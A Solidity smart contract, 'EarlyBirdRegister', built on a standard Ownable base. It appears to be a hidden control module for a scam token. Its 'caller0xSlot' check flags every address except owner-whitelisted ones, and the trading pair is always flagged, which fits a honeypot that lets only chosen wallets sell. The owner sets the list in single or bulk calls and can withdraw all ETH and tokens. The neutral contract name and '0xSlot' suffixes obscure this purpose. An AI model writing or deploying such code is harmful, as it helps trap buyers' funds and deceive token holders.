// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract EarlyBirdRegister is Ownable {
    mapping(address => bool) public free0xSlot;

    address public pair;

    receive() external payable {}

    constructor() {}

    function withdrawEth0xSlot() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawToken0xSlot(
        address target,
        uint256 amount
    ) external onlyOwner {
        bool success = IERC20(target).transfer(msg.sender, amount);
        require(success, "Transfer failed");
    }

    function caller0xSlot(address from) public view returns (bool) {
        if (from == pair || !free0xSlot[from]) {
            return true;
        }
        return false;
    }

    function setFree0xSlot(address addr, bool value) external onlyOwner {
        require(free0xSlot[addr] != value);
        free0xSlot[addr] = value;
    }

    function setBulkFree0xSlot(
        address[] memory addr,
        bool value
    ) external onlyOwner {
        for (uint256 i; i < addr.length; i++) {
            free0xSlot[addr[i]] = value;
        }
    }

    function setPair0xSlotSimple(address pair_) external onlyOwner {
        pair = pair_;
    }
}
